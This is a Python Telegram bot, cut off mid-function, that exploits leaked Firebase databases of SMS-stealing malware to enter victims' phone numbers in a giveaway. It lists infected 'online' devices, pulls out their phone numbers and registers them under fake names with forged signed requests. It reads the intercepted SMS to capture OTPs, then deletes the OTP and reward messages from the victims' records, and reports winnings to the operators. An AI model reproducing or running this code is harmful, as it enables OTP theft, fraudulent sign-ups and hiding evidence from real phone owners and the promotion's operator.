import os, re, sys, json, time, random, string, threading, queue, sqlite3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from collections import Counter, deque
import html
from urllib.parse import urlparse, parse_qs, unquote

import requests
import urllib3
import base64
import hashlib
import hmac
import asyncio

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN     = os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "")
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from collections import Counter, deque
import html
from urllib.parse import urlparse, parse_qs, unquote

import requests
import urllib3
import base64
import hashlib
import hmac
import asyncio

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes,
)


# ─── Runtime constants ───
ADMIN_IDS = {int(x) for x in re.split(r"[,\s]+", ADMIN_CHAT_ID) if x.strip().lstrip("-").isdigit()}

BATCH_CODE     = "KKD2LS01261026"
BASE_URL       = "https://golddropgolddhamaka.com"
PHOTO_FILE     = Path("photo.jpg")
PINCODE        = "500001"

OTP_TIMEOUT          = 20
OTP_POLL_INTERVAL    = 1
REQUEST_TIMEOUT      = 15
MAX_USES             = 6
DEFAULT_WORKERS      = 5
DB_PATH              = "golddrop.db"
PANELS_FILE          = "golddrop_panels.json"

# ─── Reward SMS + dead-number filter ───
BIGCITY_REWARDS_FILE     = "bigcity_rewards.json"
REWARD_SMS_TIMEOUT       = 300      # 5 minutes
REWARD_SMS_POLL_INTERVAL = 1        # seconds
REWARD_SMS_HINTS         = ("vm-bgcity", "bgcity", "golddropwins.com",
                            "reward code", "reward_code", "rewardcode")

MIN_FIREBASE_MSGS        = 5        # ≤ 5 msgs in Firebase ⇒ DEAD number, skip
FINAL_STATUSES           = ("success", "verified_no_reward")

# ─── Runtime state ───
_print_lock = threading.Lock()
_db_lock    = threading.Lock()
_job_queue  = queue.Queue()
_job_lock   = threading.Lock()
_processing_owners = set()
_active_chat_ids   = set(ADMIN_IDS)
_stop_events       = {}
_known_users       = set()
JOB_WORKERS = 1

# Terminal log ring-buffer for live status
_terminal_logs = deque(maxlen=250)
_terminal_logs_lock = threading.Lock()

def log(msg, color=None):
    colors = {"blue":"\033[94m","green":"\033[92m","yellow":"\033[93m",
              "red":"\033[91m","cyan":"\033[96m","magenta":"\033[95m","reset":"\033[0m"}
    c = colors.get(color, ""); r = colors["reset"] if c else ""
    ts = datetime.now().strftime("%H:%M:%S")
    clean_msg = re.sub(r'\x1b\[[0-9;]*m', '', str(msg)).strip()
    with _terminal_logs_lock:
        _terminal_logs.append(f"[{ts}] {clean_msg}")
    with _print_lock:
        print(f"{c}[{ts}] {msg}{r}", flush=True)
def is_admin(chat_id):
    return int(chat_id) in ADMIN_IDS

def is_authorized(chat_id):
    if not ADMIN_IDS:
        return True
    return int(chat_id) in ADMIN_IDS

# ============================================================================
#  FIREBASE PHONE EXTRACTION
# ============================================================================
PHONE_PATTERNS_WEIGHTED = [
    (re.compile(r'(?:phone|mobile|number|mob|no)[\s:]*(?:\+?91[\s-]?)?([6-9]\d{9})', re.I), 15),
    (re.compile(r'\b(?:\+91|91)?([6-9]\d{9})\b'), 10),
    (re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'), 5),
]
ONLINE_STATUS_FIELDS = ("status","online","isOnline","connected","active")
ONLINE_TRUE_VALUES   = {"true","1","online","connected","active","yes"}
SMS_SUBPATHS = ["messages","sms","inbox","Sms","SMS","callLogs",
                "calls","notifications","receivedSms","smsList"]

def _is_online(dev):
    for field in ONLINE_STATUS_FIELDS:
        raw = dev.get(field)
        if raw is None: continue
        if isinstance(raw, bool): return raw
        if isinstance(raw, int):  return raw == 1
        if str(raw).lower().strip() in ONLINE_TRUE_VALUES: return True
    return False

def _clean_phone(raw):
    if not raw: return None
    digits = re.sub(r"\D", "", str(raw))
    if digits.startswith("91") and len(digits) == 12: digits = digits[2:]
    if digits.startswith("0") and len(digits) == 11: digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789": return digits
    return None

def _phone_from_device_fields(dev):
    sims = dev.get("sims", [])
    if isinstance(sims, dict): sims = list(sims.values())
    if isinstance(sims, list):
        for sim in sims[:2]:
            if isinstance(sim, dict):
                for k in ("phoneNumber","phone","number","mobNo","mob"):
                    p = _clean_phone(sim.get(k))
                    if p: return p
    for k in ("mobNo","mob","phoneNumber","phone","number","mobile"):
        p = _clean_phone(dev.get(k))
        if p: return p
    return None

def _phone_from_messages(msgs):
    counts = Counter()
    items = msgs.values() if isinstance(msgs, dict) else (msgs if isinstance(msgs, list) else [])
    for msg in items:
        if not isinstance(msg, dict): continue
        text = str(msg.get("body") or msg.get("message") or
                   msg.get("text") or msg.get("content") or "")
        for pat, score in PHONE_PATTERNS_WEIGHTED:
            for num in pat.findall(text):
                digits = re.sub(r"\D", "", num)
                if digits.startswith("91") and len(digits) == 12: digits = digits[2:]
                if len(digits) == 10 and digits[0] in "6789": counts[digits] += score
    return counts.most_common(1)[0][0] if counts else None

def _fetch_phone_from_firebase(session, firebase_url, cid):
    try:
        r = session.get(f"{firebase_url}messages/{cid}.json", timeout=8, verify=False)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict) and data:
                return _phone_from_messages(data)
    except Exception: pass
    return None

def _count_device_messages(firebase_url, device_id, session=None):
    """Total previous SMS stored in Firebase for this device.
    A live number accumulates dozens of OTPs/promos; a dead SIM stays ≤ 5."""
    s = session or requests.Session(); s.verify = False
    total = 0
    for sub in SMS_SUBPATHS:
        try:
            r = s.get(f'{firebase_url}{sub}/{device_id}.json?shallow=true',
                      timeout=4, verify=False)
            if r.status_code != 200:
                continue
            d = r.json()
            if isinstance(d, dict):
                total += len(d)
        except Exception:
            continue
    return total

def _load_firebase_root(firebase_url):
    ROOT_KEYS = ["clients","devices","users","Clients","Devices",
                 "client","device","phones","mobiles"]
    session = requests.Session(); session.verify = False
    for key in ROOT_KEYS:
        try:
            r = session.get(f"{firebase_url}{key}.json", timeout=12, verify=False)
            if r.status_code != 200: continue
            data = r.json()
            if isinstance(data, dict) and len(data) > 0:
                return key, data
        except Exception: continue
    try:
        r = session.get(f"{firebase_url}.json?shallow=true", timeout=12, verify=False)
        root_keys = r.json()
        if isinstance(root_keys, dict):
            for key in list(root_keys.keys()):
                try:
                    r2 = session.get(f"{firebase_url}{key}.json", timeout=12, verify=False)
                    data = r2.json()
                    if isinstance(data, dict) and len(data) > 0:
                        sample = next(iter(data.values()))
                        if isinstance(sample, dict):
                            return key, data
                except Exception: continue
    except Exception: pass
    return None, None

def parse_firebase_url(link):
    if not link: return None
    link = link.strip()
    if not link.startswith(("http://","https://")):
        link = "https://" + link
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link.rstrip("/") + "/"
    parsed = urlparse(link); qs = parse_qs(parsed.query)
    enc = qs.get("s", [None])[0]
    if not enc: return None
    try:
        enc += "=" * (-len(enc) % 4)
        dec = base64.b64decode(enc).decode("utf-8").split("|")[0].strip()
        if "firebaseio.com" not in dec and "firebasedatabase.app" not in dec: return None
        if not dec.startswith(("http://","https://")): dec = "https://" + dec
        return dec.rstrip("/") + "/"
    except Exception: return None


# ============================================================================
#  ADVANCED FIREBASE URL EXTRACTOR & SMART FILTER
# ============================================================================
FIREBASE_DOMAIN_RE = re.compile(
    r'\b([a-zA-Z0-9][a-zA-Z0-9\-]*\.(?:[a-zA-Z0-9\-]+\.)*(?:firebaseio\.com|firebasedatabase\.app))\b',
    re.IGNORECASE
)

def extract_all_firebase_urls(text):
    """
    Smart filter to extract clean Firebase URLs from any input format:
    - Direct Firebase URLs (http/https or naked domains)
    - Encoded web panel URLs (e.g. ?s=... or ?panel=... or ?url=...)
    - Raw Base64 tokens anywhere in text
    - Mixed conversational text, bulk lists, and .txt file contents
    All returned URLs are normalized to 'https://<domain>/'
    """
    if not text:
        return []
    found = set()

    # 1. Direct Regex scan in raw text
    for m in FIREBASE_DOMAIN_RE.finditer(text):
        domain = m.group(1).lower().strip('.')
        found.add(f"https://{domain}/")

    # 2. Extract full URLs and inspect query parameters for encoded targets
    url_tokens = re.findall(r'https?://[^\s"\'<>]+', text)
    for u in url_tokens:
        try:
            parsed = urlparse(u)
            qs = parse_qs(parsed.query)
            for param_vals in qs.values():
                for param_val in param_vals:
                    unquoted = unquote(param_val)
                    for m in FIREBASE_DOMAIN_RE.finditer(unquoted):
                        found.add(f"https://{m.group(1).lower().strip('.')}/")
                    try:
                        cand = param_val.strip()
                        cand += "=" * (-len(cand) % 4)
                        dec = base64.b64decode(cand).decode("utf-8", errors="ignore")
                        for m in FIREBASE_DOMAIN_RE.finditer(dec):
                            found.add(f"https://{m.group(1).lower().strip('.')}/")
                    except Exception:
                        pass
        except Exception:
            pass

    # 3. Check for standalone Base64 encoded strings in text
    b64_pattern = re.compile(r'[a-zA-Z0-9+/]{16,}={0,2}')
    for b64_match in b64_pattern.finditer(text):
        cand = b64_match.group(0).strip()
        try:
            cand += "=" * (-len(cand) % 4)
            dec = base64.b64decode(cand).decode("utf-8", errors="ignore")
            for m in FIREBASE_DOMAIN_RE.finditer(dec):
                found.add(f"https://{m.group(1).lower().strip('.')}/")
        except Exception:
            pass

    # 4. Fallback line-by-line checking with original parse_firebase_url
    for l in text.splitlines():
        l = l.strip()
        if l and ('firebaseio.com' in l or 'firebasedatabase.app' in l or '?s=' in l):
            fb = parse_firebase_url(l)
            if fb:
                for m in FIREBASE_DOMAIN_RE.finditer(fb):
                    found.add(f"https://{m.group(1).lower().strip('.')}/")

    return sorted(list(found))

def extract_devices(firebase_url, blocked_phones):
    root_key, raw_data = _load_firebase_root(firebase_url)
    if not raw_data: return []
    online = {cid: dev for cid, dev in raw_data.items()
              if isinstance(dev, dict) and _is_online(dev)}
    if not online: return []
    session = requests.Session(); session.verify = False
    result, lock, seen = [], threading.Lock(), set()

    def work(cid, dev):
        phone = _phone_from_device_fields(dev) or _fetch_phone_from_firebase(session, firebase_url, cid)
        if not phone or phone in blocked_phones:
            return
        # 💀 Dead-number filter: ≤5 total msgs in Firebase ⇒ never receives OTPs
        msg_count = _count_device_messages(firebase_url, cid, session)
        if msg_count <= MIN_FIREBASE_MSGS:
            log(f"💀 dead +91{phone} (firebase msgs={msg_count} ≤ {MIN_FIREBASE_MSGS}) — skip", "yellow")
            return
        with lock:
            if phone in seen: return
            seen.add(phone)
            result.append({
                "client_id": cid,
                "phone": phone,
                "firebase_url": firebase_url,
                "firebase_msgs": msg_count,
            })

    with ThreadPoolExecutor(max_workers=60) as ex:
        futs = [ex.submit(work, cid, dev) for cid, dev in online.items()]
        for _ in as_completed(futs): pass
    return result

# ─── OTP watcher ───
def get_last_msg_key(firebase_url, device_id):
    latest, active = None, None
    s = requests.Session(); s.verify = False
    for sub in SMS_SUBPATHS:
        try:
            r = s.get(f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1',
                      timeout=4, verify=False)
            if r.status_code != 200: continue
            d = r.json()
            if isinstance(d, dict) and d:
                k = sorted(d.keys())[-1]
                if latest is None or k > latest:
                    latest, active = k, sub
        except Exception: continue
    return latest, active

def _extract_otp_from_body(body):
    from collections import defaultdict
    bl = body.lower()
    cands = re.findall(r"\b(\d{4,6})\b", body)
    if not cands: return None
    scores = defaultdict(int)
    for c in cands:
        n = int(c)
        if 1900 <= n <= 2099: continue
        scores[c] += 1
        for kw in ("otp","code","verify","verification","pin",
                   "one time","passcode","password","secret"):
            if kw in bl: scores[c] += 5; break
        if len(c) == 6: scores[c] += 3
        if re.search(rf"[₹Rs\.]\s*{re.escape(c)}", body): scores[c] -= 10
    return max(scores, key=scores.__getitem__) if scores else None

def wait_for_otp(firebase_url, device_id, last_key, timeout=None,
                 active_subpath=None, fb_session=None):
    timeout = timeout or OTP_TIMEOUT
    deadline = time.time() + timeout
    if fb_session is None:
        fb_session = requests.Session(); fb_session.verify = False
    poll_paths = ([active_subpath] + [s for s in SMS_SUBPATHS if s != active_subpath]
                  if active_subpath in SMS_SUBPATHS else SMS_SUBPATHS)
    while time.time() < deadline:
        for sub in poll_paths:
            try:
                r = fb_session.get(
                    f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=20',
                    timeout=4, verify=False)
                if r.status_code != 200: continue
                msgs = r.json()
                if not isinstance(msgs, dict): continue
                for key in sorted(msgs.keys(), reverse=True):
                    if last_key and key <= last_key: break
                    msg = msgs[key]
                    body = ""
                    if isinstance(msg, dict):
                        body = str(msg.get("body") or msg.get("message") or
                                   msg.get("text") or msg.get("content") or
                                   " ".join(str(v) for v in msg.values() if isinstance(v, str)))
                    elif isinstance(msg, str): body = msg
                    if not body: continue
                    otp = _extract_otp_from_body(body)
                    if otp: return otp, key, sub, body
            except Exception: continue
        time.sleep(OTP_POLL_INTERVAL)
    return None, None, None, None

def delete_sms_safe(firebase_url, device_id, subpath, msg_key, expected_marker):
    """Safely delete one SMS. `expected_marker` must appear in the live body
    (case-insensitive) before we issue the DELETE — protects against deleting
    a message that was edited/replaced under the same key."""
    if not (firebase_url and device_id and subpath and msg_key and expected_marker):
        return False
    try:
        r = requests.get(f"{firebase_url}{subpath}/{device_id}/{msg_key}.json", timeout=12)
        if r.status_code != 200: return False
        cur = r.json()
    except Exception: return False
    if not isinstance(cur, dict): return False
    body = str(cur.get("body") or cur.get("message") or cur.get("text") or "")
    if expected_marker.lower() not in body.lower():
        return False
    try:
        r = requests.delete(f"{firebase_url}{subpath}/{device_id}/{msg_key}.json", timeout=12)
        return r.status_code in (200, 204)
    except Exception: return False
# ─── Reward SMS snapshot + watcher ───
def _snapshot_latest_keys(firebase_url, device_id, session=None):
    s = session or requests.Session(); s.verify = False
    snaps = {}
    for sub in SMS_SUBPATHS:
        try:
            r = s.get(f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1',
                      timeout=4, verify=False)
            if r.status_code == 200:
                d = r.json()
                if isinstance(d, dict) and d:
                    snaps[sub] = sorted(d.keys())[-1]
        except Exception:
            continue
    return snaps

def _save_bigcity_reward(record):
    with _db_lock:
        data = []
        if os.path.exists(BIGCITY_REWARDS_FILE):
            try:
                with open(BIGCITY_REWARDS_FILE) as f:
                    raw = json.load(f)
                if isinstance(raw, list):
                    data = raw
                elif isinstance(raw, dict):
                    data = raw.get("rewards", [])
            except Exception:
                data = []
        data.append(record)
        with open(BIGCITY_REWARDS_FILE, "w") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

def _notify_reward_sms(record):
    text = (
        f"💸 <b>BigCity Reward SMS Received!</b>\n\n"
        f"<b>📱 Phone:</b> <code>+91{record['phone']}</code>\n"
        f"<b>🔑 OTP:</b> <code>{record['otp']}</code>\n"
        f"<b>🎁 Win:</b> {record['win_type']} — {record['reward']}\n"
        f"<b>🌐 Panel:</b> <code>{record['firebase_url']}</code>\n"
        f"<b>👤 Triggered by:</b> <code>{record['triggered_by']}</code>\n\n"
        f"<b>📨 Full SMS:</b>\n<pre>{record['message']}</pre>"
    )
    targets = {int(record["triggered_by"])} | set(ADMIN_IDS)
    for cid in targets:
        try:
            _send_sync(cid, text, parse_mode="HTML")
        except Exception as e:
            log(f"reward notify -> {cid}: {e}", "red")

def wait_for_reward_sms(firebase_url, device_id, baseline, phone, otp,
                        win_type, reward, chat_id):
    deadline = time.time() + REWARD_SMS_TIMEOUT
    s = requests.Session(); s.verify = False
    log(f"👀 Watching reward SMS for +91{phone} (up to {REWARD_SMS_TIMEOUT}s)", "cyan")
    while time.time() < deadline:
        for sub in SMS_SUBPATHS:
            base = baseline.get(sub)
            try:
                r = s.get(
                    f'{firebase_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=20',
                    timeout=4, verify=False)
                if r.status_code != 200:
                    continue
                msgs = r.json()
                if not isinstance(msgs, dict):
                    continue
                for key in sorted(msgs.keys(), reverse=True):
                    if base and key <= base:
                        break
                    msg = msgs[key]
                    body = ""
                    if isinstance(msg, dict):
                        body = str(msg.get("body") or msg.get("message") or
                                   msg.get("text") or msg.get("content") or "")
                        if not body:
                            body = " ".join(str(v) for v in msg.values() if isinstance(v, str))
                    elif isinstance(msg, str):
                        body = msg
                    if not body:
                        continue
                    low = body.lower()
                    matched = next((h for h in REWARD_SMS_HINTS if h in low), None)  # ✅ NEW
                    if not matched:
                        continue

                    record = {
                        "phone": phone,
                        "otp": otp,
                        "win_type": win_type,
                        "reward": reward,
                        "firebase_url": firebase_url,
                        "device_id": device_id,
                        "subpath": sub,
                        "msg_key": key,
                        "message": body,
                        "received_at": time.time(),
                        "received_at_iso": datetime.now().isoformat(),
                        "triggered_by": chat_id,
                        "matched_hint": matched,          # ✅ NEW (audit trail)
                    }
                    try:
                        _save_bigcity_reward(record)
                    except Exception as e:
                        log(f"bigcity save: {e}", "red")

                    _notify_reward_sms(record)
                    log(f"💸 Reward SMS [{phone}]: {body[:90]}", "green")

                    # ✅ NEW: delete the reward SMS from Firebase (safe — verifies body first)
                    deleted = delete_sms_safe(
                        firebase_url, device_id, sub, key, matched)
                    if deleted:
                        log(f"🗑 reward SMS deleted — +91{phone}", "yellow")
                        pass
                    else:
                        log(f"⚠ reward SMS delete failed — +91{phone}", "red")

                    return record
            except Exception:
                continue
        time.sleep(REWARD_SMS_POLL_INTERVAL)
    log(f"⏱ reward SMS timeout for +91{phone}", "yellow")
    return None
# ============================================================================
#  GOLDDROP API
# ============================================================================
FIRST_NAMES = ["varun","rahul","amit","arjun","rohit","suresh","vijay","kiran",
               "sneha","priya","divya","anjali","pooja","neha","swati","mounika",
               "srikar","venkat","sai","teja","abhi","nikhil","bhaskar","chandra"]
LAST_NAMES  = ["reddy","rao","kumar","sharma","varma","naidu","gupta","patel",
               "singh","joshi","chowdary","goud","yadav","dasari"]

def random_name():
    f = random.choice(FIRST_NAMES); l = random.choice(LAST_NAMES)
    return f"{f} {l}", f"{f}{l}{random.randint(100, 99999)}@gmail.com"

def encode_data(payload: dict, t_ms: int, data_key: str) -> str:
    l = base64.b64encode(str(t_ms).encode()).decode()
    d = base64.b64encode(json.dumps(payload, separators=(",", ":"),
                                    ensure_ascii=False).encode()).decode()
    hk = data_key[4:18]
    h_hex = hmac.new(hk.encode(), f"{l}.{d}".encode(), hashlib.sha256).hexdigest()
    h_b64 = base64.b64encode(h_hex.encode()).decode()
    p = random.randint(1, 6); m = random.randint(2, 8)
    salt = "".join(random.choices(string.ascii_letters + string.digits, k=m))
    y = f"{m}{p}{h_b64[:p]}{salt}{h_b64[p:]}"
    return f"{l}.{d}.{y}"

def make_session(master_key):
    s = requests.Session()
    s.cookies.set("gold-drop-id", master_key, domain="golddropgolddhamaka.com")
    s.headers.update({
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache", "pragma": "no-cache",
        "origin": BASE_URL, "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "user-agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/157.0.0.0 Safari/537.36"),
    })
    return s

def step_init(s, master_key, pincode):
    r = s.post(f"{BASE_URL}/api/users", json={
        "masterKey": master_key,
        "ipInfo": {"status":"success","country":"India","countryCode":"IN",
                   "region":"TS","regionName":"Telangana","city":"Hyderabad",
                   "zip":pincode,"lat":17.385,"lon":78.4867,
                   "timezone":"Asia/Kolkata","isp":"Jio","org":"Reliance Jio",
                   "as":"AS55836","query":"1.1.1.1"}},
        headers={"content-type":"application/json","referer":f"{BASE_URL}/"})
    uk = dk = None
    try:
        resp = r.json()
        if "resp" in resp:
            inner = json.loads(base64.b64decode(resp["resp"]).decode())
            uk = str(inner.get("userKey", "")); dk = inner.get("dataKey", "")
    except Exception: pass
    return r, uk, dk

def step_get_start(s, uk):
    return s.post(f"{BASE_URL}/api/users/get-start/{uk}",
                  headers={"content-type":"application/json","referer":f"{BASE_URL}/"})

def step_register(s, uk, dk, name, mobile, email, pincode):
    t = int(time.time() * 1000)
    payload = {"name":name,"mobile":mobile,"email":email,"pincode":pincode,
               "code":BATCH_CODE,"terms_accepted":"1","userKey":uk,"t":str(t)}
    enc = encode_data(payload, t, dk)
    if not PHOTO_FILE.exists(): return None
    with open(PHOTO_FILE, "rb") as f: photo = f.read()
    return s.post(f"{BASE_URL}/api/users/register/{uk}?t={t}",
                  files={"data":(None, enc), "img":("photo.jpg", photo, "image/jpeg")},
                  headers={"accept":"*/*","referer":f"{BASE_URL}/register"})

def step_verify_otp(s, uk, dk, otp):
    t = int(time.time() * 1000)
    enc = encode_data({"otp":otp,"userKey":uk,"t":str(t)}, t, dk)
    return s.post(f"{BASE_URL}/api/users/verify-otp/{uk}?t={t}",
                  json={"data": enc},
                  headers={"content-type":"application/json","referer":f"{BASE_URL}/otp"})

# ============================================================================
#  DB
# ============================================================================
def init_db():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("PRAGMA journal_mode=WAL")
        c.execute("""CREATE TABLE IF NOT EXISTS processed (
            phone TEXT PRIMARY KEY,
            status TEXT, reward TEXT, win_type TEXT,
            panel_url TEXT, otp TEXT, ts REAL)""")
        c.commit(); c.close()

def should_skip_phone(phone):
    """Skip phones we already finished (success / verified_no_reward)."""
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        row = c.execute("SELECT status FROM processed WHERE phone=?", (phone,)).fetchone()
        c.close()
    return bool(row) and row[0] in FINAL_STATUSES

def blocked_phones():
    """Phones already in a final state — do not process again."""
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        rows = c.execute("SELECT phone, status FROM processed").fetchall()
        c.close()
    return {phone for phone, status in rows if status in FINAL_STATUSES}

def save_processed(phone, status, reward="", win_type="", panel_url="", otp=""):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        c.execute("""INSERT OR REPLACE INTO processed
                     (phone,status,reward,win_type,panel_url,otp,ts)
                     VALUES(?,?,?,?,?,?,?)""",
                  (phone, status, str(reward), str(win_type),
                   panel_url, otp, time.time()))
        c.commit(); c.close()

def stats_summary():
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        total = c.execute("SELECT COUNT(*) FROM processed").fetchone()[0]
        succ  = c.execute("SELECT COUNT(*) FROM processed WHERE status='success'").fetchone()[0]
        rewards = c.execute("SELECT COUNT(*) FROM processed WHERE reward<>'' AND reward IS NOT NULL").fetchone()[0]
        c.close()
        return total, succ, rewards

def recent_phones(limit=20):
    with _db_lock:
        c = sqlite3.connect(DB_PATH, timeout=30)
        rows = c.execute("""SELECT phone,status,reward,ts FROM processed
                            ORDER BY ts DESC LIMIT ?""", (limit,)).fetchall()
        c.close()
        return rows

# ============================================================================
#  PANELS
# ============================================================================
def _load_panels():
    if os.path.exists(PANELS_FILE):
        try:
            with open(PANELS_FILE) as f: return json.load(f).get("user_panels", {})
        except Exception: pass
    return {}

def _save_panels(d):
    try:
        with open(PANELS_FILE, "w") as f:
            json.dump({"user_panels": d, "updated_at": time.time()}, f, indent=2)
    except Exception as e: log(f"save panels: {e}", "red")

def add_panel(uid, url):
    d = _load_panels(); uid = str(uid); d.setdefault(uid, [])
    if any(p["url"] == url for p in d[uid] if not p.get("processed")): return False
    d[uid].append({"url": url, "added_at": time.time(),
                   "processed": False, "id": int(time.time()*1000) + random.randint(0,999)})
    _save_panels(d); return True

def get_pending(uid):
    d = _load_panels(); uid = str(uid)
    return [(p.get("id",0), p["url"]) for p in d.get(uid, []) if not p.get("processed")]

def mark_processed(uid, pid):
    d = _load_panels(); uid = str(uid)
    for p in d.get(uid, []):
        if p.get("id") == pid:
            p["processed"] = True; p["processed_at"] = time.time()
            _save_panels(d); return True
    return False

def panel_counts(uid):
    d = _load_panels(); uid = str(uid); lst = d.get(uid, [])
    return len(lst), sum(1 for p in lst if not p.get("processed"))

def add_panels_bulk(uid, urls):
    d = _load_panels(); uid = str(uid); d.setdefault(uid, [])
    existing_pending = {p["url"] for p in d[uid] if not p.get("processed")}
    added = 0
    now = time.time()
    for idx, url in enumerate(urls):
        if url in existing_pending:
            continue
        existing_pending.add(url)
        d[uid].append({
            "url": url,
            "added_at": now,
            "processed": False,
            "id": int(now * 1000) + idx + random.randint(0, 999)
        })
        added += 1
    if added > 0:
        _save_panels(d)
    return added

def delete_panel(uid, pid):
    d = _load_panels(); uid = str(uid)
    if uid not in d: return False
    orig_len = len(d[uid])
    d[uid] = [p for p in d[uid] if p.get("id") != pid]
    if len(d[uid]) < orig_len:
        _save_panels(d)
        return True
    return False

def clear_all_panels(uid):
    d = _load_panels(); uid = str(uid)
    d[uid] = []
    _save_panels(d)

def clear_panels(uid):
    d = _load_panels(); uid = str(uid)
    d[uid] = [p for p in d.get(uid, []) if p.get("processed")]
    _save_panels(d)

def all_user_ids():
    return list(_load_panels().keys())

# ============================================================================
#  NOTIFY
# ============================================================================
def _send_sync(chat_id, text, parse_mode=None):
    async def _s():
        bot = Application.builder().token(BOT_TOKEN).build().bot
        await bot.send_message(chat_id=chat_id, text=text,
                               parse_mode=parse_mode, disable_web_page_preview=True)
    try:
        asyncio.run(_s())
    except RuntimeError:
        loop = asyncio.new_event_loop()
        try: loop.run_until_complete(_s())
        finally: loop.close()
    except Exception as e:
        log(f"notify -> {chat_id}: {e}", "red")

def notify_all(text, parse_mode="HTML"):
    targets = set(_active_chat_ids) | set(ADMIN_IDS)
    for cid in list(targets):
        _send_sync(cid, text, parse_mode=parse_mode)

# ============================================================================
#  WORKER
# ============================================================================
def process_phone(phone, fb_url, client_id, chat_id, otp_timeout, stop_event):
    if stop_event.is_set(): return {"phone": phone, "status": "stopped"}
    if should_skip_phone(phone):
        return {"phone": phone, "status": "skipped"}

    last_key, active_sub = get_last_msg_key(fb_url, client_id)

    master_key = str(random.randint(1000000000, 9999999999))
    s = make_session(master_key)
    _, uk, dk = step_init(s, master_key, PINCODE)
    if not uk or not dk:
        log(f"❌ Session init failed for +91{phone}", "red")
        return {"phone": phone, "status": "session_failed"}

    step_get_start(s, uk)

    name, email = random_name()
    r3 = step_register(s, uk, dk, name, phone, email, PINCODE)
    if r3 is None or r3.status_code not in (200, 201):
        log(f"❌ Register failed for +91{phone}", "red")
        return {"phone": phone, "status": "register_failed"}

    try:
        inner = json.loads(base64.b64decode(r3.json()["resp"]).decode())
        if inner.get("statusCode") != 200:
            save_processed(phone, "register_rejected", panel_url=fb_url)
            log(f"⚠ Register rejected for +91{phone}", "yellow")
            return {"phone": phone, "status": "register_rejected"}
    except Exception:
        pass

    log(f"📨 OTP requested for +91{phone}...", "cyan")
    log(f"⏳ Waiting OTP for +91{phone} (up to {otp_timeout}s)...", "yellow")

    otp, msg_key, subpath, body = wait_for_otp(
        fb_url, client_id, last_key, timeout=otp_timeout, active_subpath=active_sub)

    if not otp:
        save_processed(phone, "otp_timeout", panel_url=fb_url)
        log(f"⏱ OTP timeout for +91{phone}", "yellow")
        return {"phone": phone, "status": "otp_timeout"}

    log(f"🔑 OTP received for +91{phone}: {otp}", "green")

    # ── Snapshot reward baseline right after OTP is read (before delete/verify)
    reward_baseline = _snapshot_latest_keys(fb_url, client_id)
    if msg_key:
        for sub in SMS_SUBPATHS:
            prev = reward_baseline.get(sub)
            if not prev or prev < msg_key:
                reward_baseline[sub] = msg_key

    deleted = delete_sms_safe(fb_url, client_id, subpath, msg_key, otp)
    if deleted:
        log(f"🗑 OTP SMS deleted — +91{phone}", "yellow")
    else:
        log(f"⚠ OTP SMS delete failed — +91{phone}", "red")

    log(f"🔄 Verifying OTP {otp} for +91{phone}...", "cyan")
    r4 = step_verify_otp(s, uk, dk, otp)
    reward = win = None
    try:
        decoded = base64.b64decode(r4.json()["resp"]).decode()
        result = json.loads(decoded)
        win = result.get("win_type")
        reward = result.get("reward")

        log(f"🎁 Reward checked for +91{phone}: win={win}, reward={reward}", "cyan")

        if (win and win != "none") or reward not in (None, "", 0, "0"):
            save_processed(phone, "success",
                           reward=str(reward), win_type=str(win),
                           panel_url=fb_url, otp=otp)
            tg = (
                f"<b>🎉 GoldDrop REWARD WON!</b>\n\n"
                f"<b>📱 Phone:</b> <code>+91{phone}</code>\n"
                f"<b>🔑 OTP:</b> <code>{otp}</code>\n"
                f"<b>🎁 Win Type:</b> {win}\n"
                f"<b>💰 Reward:</b> {reward}\n"
                f"<b>🌐 Panel:</b> <code>{fb_url}</code>\n"
                f"<b>🔗 Site:</b> {BASE_URL}/\n"
                f"<b>👤 Triggered by:</b> <code>{chat_id}</code>\n\n"
                f"<b>Raw:</b>\n<pre>{json.dumps(result, indent=2)[:1500]}</pre>"
            )
            notify_all(tg)
            log(f"🎉 REWARD WON [{phone}] {win} = {reward}", "green")

            # 🚀 Watch for the BigCity reward SMS in the background
            try:
                threading.Thread(
                    target=wait_for_reward_sms,
                    args=(fb_url, client_id, reward_baseline, phone, otp,
                          win, reward, chat_id),
                    daemon=True,
                ).start()
            except Exception as e:
                log(f"spawn reward watcher: {e}", "red")

            return {"phone": phone, "status": "success",
                    "reward": reward, "win_type": win}
        else:
            save_processed(phone, "verified_no_reward",
                           panel_url=fb_url, otp=otp)
            log(f"✅ Verified +91{phone} — no reward", "yellow")
            return {"phone": phone, "status": "verified_no_reward"}
    except Exception as e:
        save_processed(phone, "verify_error", panel_url=fb_url, otp=otp)
        log(f"❌ Verify error for +91{phone}: {e}", "red")
        return {"phone": phone, "status": "verify_error"}

def enqueue(chat_id, job_type, data=None):
    with _job_lock:
        if chat_id in _processing_owners:
